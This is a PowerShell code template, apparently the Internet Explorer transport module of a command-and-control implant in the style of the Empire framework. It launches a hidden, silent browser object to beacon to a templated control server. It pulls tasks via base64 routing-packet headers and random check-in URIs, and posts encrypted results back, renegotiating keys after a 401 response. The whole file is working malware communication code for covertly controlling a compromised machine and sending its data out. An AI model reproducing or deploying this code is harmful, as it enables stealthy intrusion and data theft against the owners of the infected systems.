# Update control servers
$Script:server = "{{ host }}";
$Script:ControlServers = @("$Script:server");
$Script:ServerIndex = 0;

if(-not $IE) {
    $Script:IE=New-Object -COM InternetExplorer.Application;
    $Script:IE.Silent = $True;
    $Script:IE.visible = $False;
}
else {
    $Script:IE = $IE;
}

$script:GetTask = {
    try {
        if ($Script:ControlServers[$Script:ServerIndex].StartsWith("http")) {

            # meta 'TASKING_REQUEST' : 4
            $RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4;
            $RoutingCookie = [Convert]::ToBase64String($RoutingPacket);
            $Headers = "{{ request_header }}: $RoutingCookie";
            $script:Headers.GetEnumerator()| %{ $Headers += "$($_.Name): $($_.Value)" };

            # choose a random valid URI for checkin
            $taskURI = $script:TaskURIs | Get-Random;
            $ServerURI = $Script:ControlServers[$Script:ServerIndex] + $taskURI;

            $Script:IE.navigate2($ServerURI, 14, 0, $Null, $Headers);
            while($Script:IE.busy -eq $true){Start-Sleep -Milliseconds 100};
            $html = $Script:IE.document.GetType().InvokeMember('body', [System.Reflection.BindingFlags]::GetProperty, $Null, $Script:IE.document, $Null).InnerHtml;
            try {
                [System.Convert]::FromBase64String($html);
            }
            catch {$Null}
        }
    }
    catch {
        $script:MissedCheckins += 1
        if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
            # restart key negotiation
            Start-Negotiate -S "$Script:server" -SK $SK -UA $ua;
        }
    }
};

$script:SendMessage = {
    param($Packets)

    if($Packets) {
        # build and encrypt the response packet
        $EncBytes = Encrypt-Bytes $Packets;

        # build the top level RC4 "routing packet"
        # meta 'RESULT_POST' : 5
        $RoutingPacket = New-RoutingPacket -EncData $EncBytes -Meta 5;

        $bytes=$e.GetBytes([System.Convert]::ToBase64String($RoutingPacket));

        if($Script:ControlServers[$Script:ServerIndex].StartsWith('http')) {

            $Headers = "";
            $script:Headers.GetEnumerator()| %{ $Headers += "`r`n$($_.Name): $($_.Value)" };
            $Headers.TrimStart("`r`n");

            try {
                # choose a random valid URI for checkin
                $taskURI = $script:TaskURIs | Get-Random;
                $ServerURI = $Script:ControlServers[$Script:ServerIndex] + $taskURI;

                $Script:IE.navigate2($ServerURI, 14, 0, $bytes, $Headers);
                while($Script:IE.busy -eq $true){Start-Sleep -Milliseconds 100}
            }
            catch [System.Net.WebException]{
                # exception posting data...
                if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
                    # restart key negotiation
                    Start-Negotiate -S "$Script:server" -SK $SK -UA $ua;
                }
            }
        }
    }
};